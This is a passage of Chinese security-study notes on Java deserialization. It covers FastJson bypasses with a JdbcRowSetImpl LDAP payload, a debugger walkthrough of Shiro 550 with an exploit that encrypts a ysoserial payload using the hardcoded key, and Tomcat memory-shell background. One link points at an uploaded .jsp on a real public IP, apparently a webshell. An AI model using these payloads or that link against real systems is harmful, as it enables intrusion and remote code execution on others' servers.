<h4 id="FastJson-3"><a href="#FastJson-3" class="headerlink" title="FastJson&lt;&#x3D;1.2.48"></a>FastJson&lt;&#x3D;1.2.48</h4><p>在FastJson包里面找到继承Serializable接口的类，最后锁定的是这两个类：<code>JSONObject</code>和<code>JSONArray</code>类</p>
<p><strong>JSONArray类利用链</strong></p>
<p>首先我们要找到入口点，就是readObject方法，但是我们却发现<code>JSONArray</code>中并不存在<code>readObject</code>方法，并且他<code>extends</code>对应的<code>JSON</code>类也没有readObect方法，所以这里我们只有通过其他类的readObject方法来触发JSONArray或者JSON的某个方法来实现调用链。</p>
<p>这里我们就要引入toString方法，我们可以发现在Json类中存在toString方法能够触发toJSONString方法的调用。然后我们再来探索一下</p>
<p>如果可以触发getter方法，就能够进行进一步的调用链</p>
<p><strong>Person.java</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.y5neko.sec.fastjson;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name, <span class="type">int</span> age)</span>&#123;<span class="built_in">this</span>.name = name;<span class="built_in">this</span>.age = age;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">()</span>&#123;System.out.println(<span class="string">&quot;constructor被调用了&quot;</span>);&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;System.out.println(<span class="string">&quot;getName被调用了&quot;</span>);<span class="keyword">return</span> <span class="built_in">this</span>.name;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;System.out.println(<span class="string">&quot;setName被调用了&quot;</span>);<span class="built_in">this</span>.name = name;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;System.out.println(<span class="string">&quot;getAge被调用了&quot;</span>);<span class="keyword">return</span> <span class="built_in">this</span>.age;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123; System.out.println(<span class="string">&quot;setAge被调用了&quot;</span>);<span class="built_in">this</span>.age = age;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>NativeDemo.java</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.y5neko.sec.fastjson;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">NativeDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line">        <span class="type">String</span> <span class="variable">JSON_Serialize</span> <span class="operator">=</span> JSON.toJSONString(person);</span><br><span class="line">        System.out.println(JSON_Serialize);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<img src="/image/image-20231025110811498.png" alt="image-20231025110811498" style="zoom:80%;" />

<p>综上分析，我们找到一个能够readObject的类，调用toString方法，然后调用toJSONString方法，再调用getter，即可实现反序列化利用。</p>
<h3 id="fastjson面试总结-by-寒神"><a href="#fastjson面试总结-by-寒神" class="headerlink" title="fastjson面试总结 by 寒神"></a>fastjson面试总结 by 寒神</h3><p>fastjson 1.2.24<br>TemplatesImpl。 服务端开启特殊参数 Feature.SupportNonPublicFiel<br>Fastjson 的 json.parse()会调用类的getter和setter方法，而TemplatesImpl的getOutputProperties()会调用newTransformer()然后getTransletInstance()然后加载_bytecodes数组，并且newInstane。</p>
<p>JdbcRowSetImpl </p>
<p>JdbcRowSetImpl反序列化时，调用setter方法，触发setAutoCommit()，在this.conn为空时，调用this.connect()，这里面调用了javax.naming.InitialContext#lookup()，参数从dataSourceName成员变量获取</p>
<p>1.2.25 增加了checkAutoType，如果开了就 判断白名单，再判断黑名单，通过了就加载。但是可以通过描述符[ L ;来绕过</p>
<p>1.2.42 把明文黑名单转为了hash黑名单防止黑客进行分析，并且checkAutoType判断，如果L开头 ; 结尾就substring截断去除。但是由于是递归处理描述符的，双写LL;; 就绕过了</p>
<p>1.2.43 ban掉了L，用[ 绕</p>
<p>1.2.44 ban掉了 [</p>
<p>1.2.45 JndiDataSourceFactory的 由于payload中设置了properties属性值，JndiDataSourceFactory.setProperties()<br>InitCtx.lookup(properties.getProperty(“data_source”)); 从properties中获取了data_source</p>
<p>1.2.47 通过 java.lang.Class，将JdbcRowSetImpl类加载到Map中缓存，从而绕过AutoType的检测。因此将payload分两次发送，第一次加载，第二次执行。与1.2.24的区别就是将JdbcRowSetImpl加载到了Map中缓存</p>
<p> String payload  &#x3D; “{&quot;a&quot;:{&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;},”<br>                + “&quot;b&quot;:{&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,”<br>                + “&quot;dataSourceName&quot;:&quot;ldap:&#x2F;&#x2F;localhost:1389&#x2F;Exploit&quot;,&quot;autoCommit&quot;:true}}”;<br>        JSON.parse(payload);</p>
<p>1.2.68 safeMode loadClass 重载方法默认的调用改为不缓存 通过AutoCloseable 任意文件写入 AutoCloseable是白名单</p>
<p>不出网利用<br>Commons-io 写文件&#x2F;webshell<br>但写webshell需要知道网站路径，不然就无法利用<br>如果为高权限，可尝试写定时任务，免密钥，等等（这些只是在理论情况下的猜想）<br>低版本限制&lt; fastjson 1.2.68</p>
<p>C3P0二次序列化 之 hex序列化字节加载器</p>
<p>BECL攻击，命令执行&#x2F;内存马<br>becl攻击则是利用tomcat的BasicDataSource链<br>编译poc，将poc的class字节码转化为bcel然后发送payload</p>
<h2 id="Tomcat"><a href="#Tomcat" class="headerlink" title="Tomcat"></a>Tomcat</h2><h2 id="Log4j"><a href="#Log4j" class="headerlink" title="Log4j"></a>Log4j</h2><h2 id="Shiro"><a href="#Shiro" class="headerlink" title="Shiro"></a>Shiro</h2><h3 id="shiro550"><a href="#shiro550" class="headerlink" title="shiro550"></a>shiro550</h3><h4 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h4><p>Shiro 550 反序列化漏洞存在版本：shiro &lt;1.2.4，产生原因是因为shiro接受了Cookie里面<code>rememberMe</code>的值，然后去进行Base64解密后，再使用aes密钥解密后的数据，进行反序列化。</p>
<p>反过来思考一下，如果我们构造该值为一个cc链序列化后的值进行该密钥aes加密后进行base64加密，那么这时候就会去进行反序列化我们的payload内容，这时候就可以达到一个命令执行的效果。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">登录成功并且点了rememberMe选项：</span><br><span class="line">writeObject序列化 -&gt; AES加密 -&gt; Base64编码 -&gt; 返回到Cookie内</span><br><span class="line"></span><br><span class="line">Cookie带着这段base64编码，代表ji&#x27;zhu</span><br><span class="line">获取rememberMe值 -&gt; Base64解密 -&gt; AES解密 -&gt; 调用readobject反序列化操作</span><br></pre></td></tr></table></figure>

<h4 id="分析-5"><a href="#分析-5" class="headerlink" title="分析"></a>分析</h4><p><strong>漏洞环境</strong>：这里我是直接用的vulhub的shiro550demo</p>
<h5 id="普通登录"><a href="#普通登录" class="headerlink" title="普通登录"></a>普通登录</h5><p>我们直接下断点在登陆判定</p>
<p><img src="/image/image-20231121232506327.png" alt="image-20231121232506327"></p>
<p>然后回到web正常登录试试</p>
<p><img src="/image/image-20231121232835725.png" alt="image-20231121232835725"></p>
<p><img src="/image/image-20231121233908447.png" alt="image-20231121233908447"></p>
<p>可以看到在这里获取了三个登陆参数的值，然后带入<code>UsernamePasswordToken</code>类进行处理，跟进看一下这个类做了什么</p>
<img src="/image/image-20231121235615547.png" alt="image-20231121235615547" style="zoom:80%;" />

<p>从文档了解到这个类是封装了提交的用户名密码以及<code>rememberMe</code>是否勾选，继续跟进</p>
<img src="/image/image-20231122000608042.png" alt="image-20231122000608042" style="zoom:80%;" />

<p>这里设置好了四个字段，回到<code>UserController</code>类</p>
<img src="/image/image-20231122002002045.png" alt="image-20231122002002045" style="zoom:80%;" />

<p>可以看到把<code>UsernamePasswordToken</code>对象传入了<code>subject</code>的<code>login</code>方法，这里的<code>subject</code>对象实际上获取到的是<code>WebDelegatingSubject</code>对象</p>
<p><img src="/image/image-20231122002554451.png" alt="image-20231122002554451"></p>
<p>而<code>WebDelegatingSubject</code>对象是<code>DelegatingSubject</code>的子类，跟进到<code>DelegatingSubject</code>的<code>login</code>方法</p>
<p><img src="/image/image-20231122002857818.png" alt="image-20231122002857818"></p>
<p>这里又调用了<code>securityManager</code>的<code>login</code>方法来对token进行校验，即<code>DefaultSecurityManager</code>的login方法，判断是否有这个用户</p>
<img src="/image/image-20231122004435359.png" alt="image-20231122004435359" style="zoom:80%;" />

<p>login方法通过抽象类<code>AuthenticatingSecurityManager</code>的<code>authenticate</code>方法进行验证</p>
<p><img src="/image/image-20231122005026803.png" alt="image-20231122005026803"></p>
<p>这里包装的<code>authenticator</code>是<code>ModularRealmAuthenticator</code>，跟进</p>
<img src="/image/image-20231122005320985.png" alt="image-20231122005320985" style="zoom:80%;" />

<p>继承自<code>AbstractAuthenticator</code>，跟进到<code>authenticate</code>方法，中间又调用了<code>doAuthenticate</code>方法</p>
<img src="/image/image-20231122010014736.png" alt="image-20231122010014736" style="zoom:80%;" />

<img src="/image/image-20231122010248488.png" alt="image-20231122010248488" style="zoom:80%;" />

<p>跟进到<code>doAuthenticate</code>方法，这个方法是通过迭代Realm的内部集合来验证token，如果realm有多个，会多个迭代验证，如果realm只有一个，则直接调用<code>doSingleRealmAuthentication</code></p>
<img src="/image/image-20231122010612502.png" alt="image-20231122010612502" style="zoom:80%;" />

<p>可以看到我们只有一个<code>MainRealm</code>，那么直接跟进到<code>MainRealm</code>的<code>Authenticator</code></p>
<img src="/image/image-20231122010813998.png" alt="image-20231122010813998" style="zoom:80%;" />

<p>验证账号密码，通过则返回一个<code>SimpleAuthenticationInfo</code>，失败则抛出报错，最后将登录验证后的信息全部return，回到<code>UserController</code></p>
<img src="/image/image-20231122012927052.png" alt="image-20231122012927052" style="zoom:80%;" />

<p>至此整个普通登录流程分析完毕</p>
<h5 id="勾选rememberMe登录，产生rememberMe"><a href="#勾选rememberMe登录，产生rememberMe" class="headerlink" title="勾选rememberMe登录，产生rememberMe"></a>勾选rememberMe登录，产生rememberMe</h5><p>shiro550的主要漏洞点是rememberMe参数，我们来看看勾选了rememberMe后的登录流程</p>
<img src="/image/image-20231122011201472.png" alt="image-20231122011201472" style="zoom:80%;" />

<p>其他步骤和普通登录一样，我们直接跟到<code>UsernamePasswordToken</code></p>
<img src="/image/image-20231122011323210.png" alt="image-20231122011323210" style="zoom:80%;" />

<img src="/image/image-20231122011435067.png" alt="image-20231122011435067" style="zoom:80%;" />

<img src="/image/image-20231122011445204.png" alt="image-20231122011445204" style="zoom:80%;" />

<p>回到<code>UserController</code>，跟进<code>DelegatingSubject</code>的login方法</p>
<img src="/image/image-20231122011634356.png" alt="image-20231122011634356" style="zoom:80%;" />

<p>跟进到<code>DefaultSecurityManager</code>的login方法，完成了验证之后会调用<code>onSuccessfulLogin</code>方法</p>
<img src="/image/image-20231122012303077.png" alt="image-20231122012303077" style="zoom:80%;" />

<p>跟进到<code>onSuccessfulLogin</code>方法</p>
<img src="/image/image-20231122013136299.png" alt="image-20231122013136299" style="zoom:80%;" />

<p>调用了<code>rememberMeSuccessfulLogin</code>方法，继续跟进</p>
<img src="/image/image-20231122013235520.png" alt="image-20231122013235520" style="zoom:80%;" />

<p>此时rmm通过<code>getRememberMeManager</code>方法获取到了一个<code>RememberMeManager</code>对象</p>
<img src="/image/image-20231122013432211.png" alt="image-20231122013432211" style="zoom:80%;" />

<p>我们来看看<code>RememberMeManager</code>对象是怎么来的</p>
<img src="/image/image-20231122013652575.png" alt="image-20231122013652575" style="zoom:80%;" />

<p>跟进<code>RememberMeManager</code>，一共有两处实现了这个接口</p>
<img src="/image/image-20231122013837658.png" alt="image-20231122013837658" style="zoom:80%;" />

<p>回到<code>ShiroConfig</code>类，我们可以看到这里是通过<code>cookieRememberMeManager</code>作为RememberMeManager</p>
<img src="/image/image-20231122014105448.png" alt="image-20231122014105448" style="zoom:80%;" />

<p>直接跟进到<code>cookieRememberMeManager</code>类</p>
<img src="/image/image-20231122014759058.png" alt="image-20231122014759058" style="zoom:80%;" />

<p>跟进到父类<code>AbstractRememberMeManager</code></p>
<img src="/image/image-20231122015134647.png" alt="image-20231122015134647" style="zoom:80%;" />

<p>这里是base64编码后的硬编码key</p>
<img src="/image/image-20231122015319506.png" alt="image-20231122015319506" style="zoom:80%;" />

<p>实例化时设置了默认的序列化器、设置加密服务为AES以及密钥，参数如下</p>
<img src="/image/image-20231122015503145.png" alt="image-20231122015503145" style="zoom:80%;" />

<p>此时我们获取到了一个完整的<code>cookieRememberMeManager</code></p>
<img src="/image/image-20231122015939611.png" alt="image-20231122015939611" style="zoom:80%;" />

<p>回到<code>rememberMeSuccessfulLogin</code>方法</p>
<img src="/image/image-20231122020911756.png" alt="image-20231122020911756" style="zoom:80%;" />

<p>调用了rmm的<code>onSuccessfulLogin</code>方法</p>
<img src="/image/image-20231122021025908.png" alt="image-20231122021025908" style="zoom:80%;" />

<img src="/image/image-20231122095638165.png" alt="image-20231122095638165" style="zoom:80%;" />

<p>删除身份数据后，通过<code>isRememberMe</code>来判断是否启用了rememberMe</p>
<img src="/image/image-20231122100024273.png" alt="image-20231122100024273" style="zoom:80%;" />

<img src="/image/image-20231122100642219.png" alt="image-20231122100642219" style="zoom:80%;" />

<p>如果为true则进入<code>rememberIdentity</code>流程，先从authcInfo获取了账号主体，这一步是通过LinkedHashMap来追踪账号主体</p>
<img src="/image/image-20231122102100281.png" alt="image-20231122102100281" style="zoom:80%;" />

<p>接着带着subject和主体进入下一个重载方法</p>
<img src="/image/image-20231122101454796.png" alt="image-20231122101454796" style="zoom:80%;" />

<img src="/image/image-20231122101743245.png" alt="image-20231122101743245" style="zoom:80%;" />

<p>将帐户主体converting成字节数组的这一步就是我们的重点，直接跟进</p>
<img src="/image/image-20231122102710239.png" alt="image-20231122102710239" style="zoom:80%;" />

<p>通过文档了解到这一步是为了把主体集合转换成“记住登录”的数组，首先通过serialize将主体序列化为字节数组</p>
<img src="/image/image-20231122103037285.png" alt="image-20231122103037285" style="zoom:80%;" />

<p>接着调用<code>getCipherService</code>获取加密服务对字节数组进行加密，也就是之前提到的AES加密流程</p>
<img src="/image/image-20231122103142931.png" alt="image-20231122103142931" style="zoom:80%;" />

<img src="/image/image-20231122103304955.png" alt="image-20231122103304955" style="zoom:80%;" />

<p>接着返回加密后的字节数组，回到<code>rememberIdentity</code>方法，进入最后一步<code>rememberSerializedIdentity</code></p>
<img src="/image/image-20231122103534729.png" alt="image-20231122103534729" style="zoom:80%;" />

<p><img src="/image/image-20231122103629854.png" alt="image-20231122103629854"></p>
<p>在此处实现</p>
<img src="/image/image-20231122103711227.png" alt="image-20231122103711227" style="zoom:80%;" />

<img src="/image/image-20231122103733649.png" alt="image-20231122103733649" style="zoom:80%;" />

<p>后面的步骤就很好理解了，先对传入的加密后的字节数组进行一次Base64编码，然后获取cookie模板创建一个SimpleCookie对象，接着通过操作SimpleCookie对象，把最终的rememberMe放进HTTP请求中的cookie</p>
<img src="/image/image-20231122104323116.png" alt="image-20231122104323116" style="zoom:80%;" />

<img src="/image/image-20231122104906827.png" alt="image-20231122104906827" style="zoom:80%;" />

<img src="/image/image-20231122105413804.png" alt="image-20231122105413804" style="zoom:80%;" />

<p>至此，整个产生rememberMe的流程分析完毕</p>
<h5 id="rememberMe自动登录"><a href="#rememberMe自动登录" class="headerlink" title="rememberMe自动登录"></a>rememberMe自动登录</h5><p>上面分析了rememberMe产生的过程，接下来我们带着rememberMe直接访问，还是在登录判断处下断点</p>
<p>一路跟进到<code>DefaultSecurityManager</code>的login方法，在验证完token之后会通过<code>createSubject</code>创建登录后的Subject对象</p>
<img src="/image/image-20231122112019024.png" alt="image-20231122112019024" style="zoom:80%;" />

<p>我们直接跟进到<code>createSubject</code>方法</p>
<img src="/image/image-20231122114444348.png" alt="image-20231122114444348" style="zoom:80%;" />

<p>带着注释简单分析一下过程，首先通过<code>ensureSecurityManager</code>补充上SecurityManager实例，然后通过<code>resolveSession</code>解析Session，接着通过<code>resolvePrincipals</code>方法解析用户主体，最后再用context创建Subject实例</p>
<p>触发点就在解析用户主体的过程中，我们直接跟进</p>
<img src="/image/image-20231122115150347.png" alt="image-20231122115150347" style="zoom:80%;" />

<img src="/image/image-20231122132612274.png" alt="image-20231122132612274" style="zoom:80%;" />

<p>在这个过程中，先解析了主体，如果主体为空再通过调用<code>getRememberedIdentity</code>检查rememberMe身份，跟进</p>
<img src="/image/image-20231122132709198.png" alt="image-20231122132709198" style="zoom:80%;" />

<p>这里首先获取<code>RememberMeManager</code>，如果不为空则调用rmm的<code>getRememberedPrincipals</code>方法，跟进到<code>CookieRememberMeManager</code>的<code>getRememberedPrincipals</code>方法</p>
<img src="/image/image-20231122133353077.png" alt="image-20231122133353077" style="zoom:80%;" />

<p>这其中一共有两个重要方法<code>getRememberedSerializedIdentity</code>和<code>convertBytesToPrincipals</code>，我们首先看第一个</p>
<img src="/image/image-20231122133523076.png" alt="image-20231122133523076" style="zoom:80%;" />

<img src="/image/image-20231122134050624.png" alt="image-20231122134050624" style="zoom:80%;" />

<p>通过<code>getCookie().readValue()</code>获取cookie中rememberMe的值</p>
<img src="/image/image-20231122134155403.png" alt="image-20231122134155403" style="zoom:80%;" />

<p>把value返回后在<code>getRememberedSerializedIdentity</code>中进行base64解码，然后转为字节数组并return</p>
<p>回到<code>getRememberedPrincipals</code>，如果返回的字节数组不为空则继续下一步<code>convertBytesToPrincipals</code></p>
<img src="/image/image-20231122134620971.png" alt="image-20231122134620971" style="zoom:80%;" />

<img src="/image/image-20231122134758200.png" alt="image-20231122134758200" style="zoom:80%;" />

<p>这里是获取解密服务，步骤和前面一样，通过AES解密字节数组，最后交给<code>deserialize</code>进行反序列化</p>
<img src="/image/image-20231122135111765.png" alt="image-20231122135111765" style="zoom:80%;" />

<img src="/image/image-20231122135145997.png" alt="image-20231122135145997" style="zoom:80%;" />

<img src="/image/image-20231122135238815.png" alt="image-20231122135238815" style="zoom:80%;" />

<p>这就是最终触发反序列化的地方，返回一个账号主体</p>
<img src="/image/image-20231122135443143.png" alt="image-20231122135443143" style="zoom:80%;" />

<p>至此，整个rememberMe自动登录的过程分析完毕</p>
<h4 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h4><p>经过所有的分析，我们知道了如何通过rememberMe进行反序列化，接下来构造exp利用</p>
<p>首先用ysoserial生成CC1的payload</p>
<img src="/image/image-20231122192403843.png" alt="image-20231122192403843" style="zoom:80%;" />

<p>接下来我们来构造EXP</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.y5neko.sec.shiro;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.crypto.AesCipherService;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.crypto.CipherService;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.util.ByteSource;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Shiro550_Exp</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">//我们直接调用shiro的AES服务来进行加密</span></span><br><span class="line">        <span class="type">byte</span>[] DEFAULT_CIPHER_KEY_BYTES = org.apache.shiro.codec.Base64.decode(<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>);</span><br><span class="line">        <span class="type">CipherService</span> <span class="variable">cipherService</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AesCipherService</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//读取payload为字节数组</span></span><br><span class="line">        <span class="type">byte</span>[] bytes = Files.readAllBytes(Paths.get(<span class="string">&quot;H:\\Java_Project\\Java_Security\\src\\com\\y5neko\\sec\\shiro\\shiro550&quot;</span>));</span><br><span class="line">        <span class="comment">//AES加密</span></span><br><span class="line">        <span class="type">ByteSource</span> <span class="variable">byteSource</span> <span class="operator">=</span> cipherService.encrypt(bytes, DEFAULT_CIPHER_KEY_BYTES);</span><br><span class="line">        <span class="type">byte</span>[] value = byteSource.getBytes();</span><br><span class="line">        <span class="comment">//Base64编码</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">base64</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(value);</span><br><span class="line">        System.out.println(base64);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<img src="/image/image-20231122215219157.png" alt="image-20231122215219157" style="zoom:80%;" />

<img src="/image/image-20231122215333208.png" alt="image-20231122215333208" style="zoom:80%;" />

<h3 id="绕过waf执行"><a href="#绕过waf执行" class="headerlink" title="绕过waf执行"></a>绕过waf执行</h3><p><a href="https://mp.weixin.qq.com/s/N4wF28mCWprD2edSd91L0Q">https://mp.weixin.qq.com/s/N4wF28mCWprD2edSd91L0Q</a></p>
<h2 id="JBoss"><a href="#JBoss" class="headerlink" title="JBoss"></a>JBoss</h2><h2 id="Struts"><a href="#Struts" class="headerlink" title="Struts"></a>Struts</h2><h2 id="Spring"><a href="#Spring" class="headerlink" title="Spring"></a>Spring</h2><h2 id="Redis"><a href="#Redis" class="headerlink" title="Redis"></a>Redis</h2><h2 id="ThinkPHP"><a href="#ThinkPHP" class="headerlink" title="ThinkPHP"></a>ThinkPHP</h2><h2 id="Vcenter"><a href="#Vcenter" class="headerlink" title="Vcenter"></a>Vcenter</h2><h2 id="CommonCollections"><a href="#CommonCollections" class="headerlink" title="CommonCollections"></a>CommonCollections</h2><h3 id="CC1"><a href="#CC1" class="headerlink" title="CC1"></a>CC1</h3><h2 id="e-cology"><a href="#e-cology" class="headerlink" title="e-cology"></a>e-cology</h2><p><a href="http://182.150.63.102:7180/formmode/apps/upload/ktree/images/17018768907903b4b9ae1-0e54-48c9-9462-9298a2139706.jsp">http://182.150.63.102:7180/formmode/apps/upload/ktree/images/17018768907903b4b9ae1-0e54-48c9-9462-9298a2139706.jsp</a></p>
<h1 id="内存马相关"><a href="#内存马相关" class="headerlink" title="内存马相关"></a>内存马相关</h1><p>环境：<a href="https://dlcdn.apache.org/tomcat/tomcat-9/v9.0.89/bin/">https://dlcdn.apache.org/tomcat/tomcat-9/v9.0.89/bin/</a></p>
<h2 id="Servlet容器与Engine、Host、Context和Wrapper"><a href="#Servlet容器与Engine、Host、Context和Wrapper" class="headerlink" title="Servlet容器与Engine、Host、Context和Wrapper"></a>Servlet容器与Engine、Host、Context和Wrapper</h2><p><code>Tomcat</code>设计了四种容器，分别是<code>Engine</code>、<code>Host</code>、<code>Context</code>和<code>Wrapper</code>，其关系如下：</p>
<img src="/image/image-20240618102910365.png" alt="image-20240618102910365" style="zoom:80%;" />

<p>要访问<code>https://manage.xxx.com:8080/user/list</code>，那<code>tomcat</code>是如何实现请求定位到具体的<code>servlet</code>的呢？为此<code>tomcat</code>设计了<code>Mapper</code>，其中保存了容器组件与访问路径的映射关系。</p>
<ul>
<li>根据协议和端口号选定<code>Service</code>和<code>Engine</code>。</li>
</ul>
<p>我们知道<code>Tomcat</code>的每个连接器都监听不同的端口，比如<code>Tomcat</code>默认的<code>HTTP</code>连接器监听<code>8080</code>端口、默认的<code>AJP</code>连接器监听<code>8009</code>端口。上面例子中的URL访问的是<code>8080</code>端口，因此这个请求会被<code>HTTP</code>连接器接收，而一个连接器是属于一个<code>Service</code>组件的，这样<code>Service</code>组件就确定了。我们还知道一个<code>Service</code>组件里除了有多个连接器，还有一个容器组件，具体来说就是一个<code>Engine</code>容器，因此<code>Service</code>确定了也就意味着<code>Engine</code>也确定了。</p>
<ul>
<li>根据域名选定<code>Host</code>。</li>
</ul>
<p><code>Service</code>和<code>Engine</code>确定后，<code>Mapper</code>组件通过<code>url</code>中的域名去查找相应的<code>Host</code>容器，比如例子中的<code>url</code>访问的域名是<code>manage.xxx.com</code>，因此<code>Mapper</code>会找到<code>Host1</code>这个容器。</p>
<ul>
<li>根据<code>url</code>路径找到<code>Context</code>组件。</li>
</ul>
<p><code>Host</code>确定以后，<code>Mapper</code>根据<code>url</code>的路径来匹配相应的<code>Web</code>应用的路径，比如例子中访问的是<code>/user</code>，因此找到了<code>Context1</code>这个<code>Context</code>容器。</p>
<ul>
<li>根据<code>url</code>路径找到<code>Wrapper</code>（<code>Servlet</code>）。</li>
</ul>
<p><code>Context</code>确定后，<code>Mapper</code>再根据<code>web.xml</code>中配置的<code>Servlet</code>映射路径来找到具体的<code>Wrapper</code>和<code>Servlet</code>，例如这里的<code>Wrapper1</code>的<code>/list</code>。</p>
<img src="/image/image-20240618103421280.png" alt="image-20240618103421280" style="zoom:80%;" />

<h2 id="servlet测试"><a href="#servlet测试" class="headerlink" title="servlet测试"></a>servlet测试</h2><p>pom.xml如下</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.y5neko<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>JavaMemshellLearn<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">maven.compiler.source</span>&gt;</span>8<span class="tag">&lt;/<span class="name">maven.compiler.source</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">maven.compiler.target</span>&gt;</span>8<span class="tag">&lt;/<span class="name">maven.compiler.target</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">project.build.sourceEncoding</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">project.build.sourceEncoding</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>javax.servlet-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.0.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>TestServlet.java</p>
